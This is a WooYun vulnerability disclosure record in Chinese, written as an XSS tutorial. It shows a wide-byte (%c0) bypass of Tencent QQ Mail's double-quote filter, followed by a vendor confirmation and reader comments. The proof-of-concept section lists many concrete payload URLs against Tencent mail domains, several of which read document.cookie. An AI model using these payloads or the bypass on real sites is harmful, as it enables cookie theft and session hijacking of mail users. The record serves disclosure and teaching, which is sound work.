{"id": 14917, "wybug_id": "wooyun-2012-015969", "wybug_title": "[腾讯实例教程] 那些年我们一起学XSS - 4. 宽字节复仇记 [QQ邮箱基本通用]", "wybug_corp": "腾讯", "wybug_author": "心伤的瘦子", "wybug_date": "2012-12-13 17:45", "wybug_open_date": "2013-01-27 17:46", "wybug_type": "xss跨站脚本攻击", "wybug_level": "低", "wybug_rank_0": "1", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-12-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2012-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2012-12-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-01-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-01-27：\t细节向公众公开  简要描述： 前面教程第2节，说到了输出在<script>..</script>之间的情况。也说到了后面会再继续一些有意思的例子。 实际上，我们碰到的往往不是那么好。很多情况下，程序员都是会过滤的。 那么我们怎么办呢？“因地制宜，因材施教。” 根据漏洞的实际情况，我们可以各种绕过。 不知道这里乱用成语没啊。 惶恐不安中。这里先看看第一种方法，宽字节绕过。 详细说明：  1. 有一个比较经典的SQL注入，是宽字节注入。玩渗透的可能对这个都比较清楚。2. 有时候，宽字节确实可以带来奇效～～下面我们看腾讯的一个例子。3. 例子如下：\nhttp://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%22;alert(1);//aaaaaa\n我们尝试注入 \" 来闭合前面的双引号，但是很悲剧的是，双引号被过滤了。。如下图：\n\n看到这种情况，一般人估计会放弃了吧，至少说明程序员注意到了这里，并且过滤了。然后我们可以看到编码是：\n<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb18030\" />\ngbxxxx系列的编码，那么我们尝试一下宽字节呢？\nhttp://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%c0%22;alert(1);//aaaaaa\n看看效果：\n\n弹个窗：\n\n利用宽字节，我们华丽的复仇了“腾讯对双引号的屠杀”。至于这个漏洞的成因，和传统的宽字节漏洞并不一样。目测应该是由于过滤双引号的正则表达式写得有问题造成的。并不是因为%22变成了 %5c%22,而 %c0吃掉了后面的%5c。 而后面这种情况，在腾讯的相关站点暂时没有发现实际案例。 如果有，欢迎大家分享。   漏洞证明：  不一一列举了。有这个参数的基本都有问题。 http://msgopt.mail.qq.com/cgi-bin/readtemplate?sid=ktqO7DjMQcJuAABQ&folderid=9&page=0&t=aaaa%c0%22;alert(1);//bbbbx&loc=folderlist,,,9http://r.mail.qq.com/cgi-bin/reader_main?sid=ktqO7DjMQcJuAABQ&t=aaaa%c0\"bbbbx&source=folderlisthttps://exmail.qq.com/cgi-bin/bizmail?sid=N7fzoGwkeI8ydyRo,7&action=show_user&alias=zhaopin@ucanlove.com&t=%c0\"ccccbbbbx&s=showaccounthttps://exmail.qq.com/cgi-bin/loginpage?errtype=3&verify=true&clientuin=info&t=dm_loginpage&d=fartech.cn&s=&alias=&regalias=&delegate_url=&title=&url=%2Fcgi-bin%2Flogin%3F&org_fun=&aliastype=other&ss=&from=&autologin=n&param=&sp=&r=b63f6de34c24eeb8a3099ab4bbfc1b8d&ppp=&secpp=%c0%22onmousebbbb=alert(document.cookie);//&dmtype=bizmailhttp://open.mail.qq.com/cgi-bin/qm_help_mailme?sid=,2,zh_CN&t=%c0\"ccccbbbbxhttp://open.mail.qq.com/cgi-bin/communication?sid=,2,zh_CN&t=%c0\"ccccbbbbx&action=http://open.mail.qq.com/cgi-bin/feedback_loop?sid=,2,zh_CN&check=false&t=%c0\"ccccbbbbx&action=http://exmail.qq.com/cgi-bin/viewdocument?sid=H6Mg9z5XNfqsfhdH,7&filename=%CC%EC%BD%F2%BB%C6%BD%F0%C8%D5%D6%DC%C6%C00917.doc&mailid=ZL2017-RfnEvncOeLfhJ04eTPrSU29&retry=true&t=%c0%22ccccbbbbx&ef=qfunchttp://reader.qq.com/cgi-bin/rss_main?sid=MTOtOYwpx56MMzN9&t=aaaa%c0%22;alert(document.cookie);//bbbbx&s=mag&r=222&init=true&update=1   修复方案：  修复相关过滤机制。   版权声明：转载请注明来源 心伤的瘦子@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2012-12-17 14:49 厂商回复： 非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案。如有任何新的进展我们将会及时同步。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2012-12-13 17:57 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  前排出租。。    \n     2012-12-13 17:57 |    \t\t疯子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:42        | 世人笑我太疯癫，我笑世人看不穿~)\t\t \n  ....求打包教程。    \n     2012-12-13 17:58 |    \t\tdyun \t\t\t( 普通白帽子  |\t\t\t        Rank:102 漏洞数:15        | [code][/code])\t\t \n  mark 这系列，慢慢看~~~    \n     2012-12-13 20:21 |    \t\tD＆G \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:103        | going)\t\t \n  前三没了~    \n     2012-12-14 16:07 |    \t\t街球幽灵 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:5        | 社会工程学研究，手机维修工程师。)\t\t \n  广告位出租～    \n     2012-12-17 15:20 |    \t\t︶ㄣ歪瓜劣枣 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:1        | 混乱)\t\t \n  ....求打包教程。    \n     2012-12-17 20:06 |    \t\tXhm1n9 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:13        | bug)\t\t \n  顶胖子    \n     2012-12-23 23:01 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  一块打印成书收藏    \n     2013-01-17 08:57 |    \t\tfox \t\t\t( 普通白帽子  |\t\t\t        Rank:159 漏洞数:16        | fox)\t\t \n  可以打包出书了    \n     2013-01-27 17:59 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  赞    \n     2013-01-27 19:47 |    \t\t陈再胜 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:13        | 微博收收听~~~●﹏●)\t\t \n  求第二季~~~    \n     2013-02-16 15:10 |    \t\tmole3o \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:2        | 学生一枚，青春向上的白帽子。)\t\t \n  受益匪浅。    \n     2013-11-05 10:02 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  @心伤的瘦子 你和@心伤的胖子是什么关系啊    \n     2014-06-14 10:38 |    \t\tqingxp9 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | ~~~)\t\t \n  精彩    \n     2014-08-06 00:37 |    \t\t大风对我说 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 酱油党)\t\t \n  学习了    \n     2014-08-14 21:18 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  学习    \n     2015-02-02 18:57 |    \t\tMaxson \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:8        | 莫找借口失败，只找理由成功！)\t\t \n  静静的坐在这 看看楼主发不发打包    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}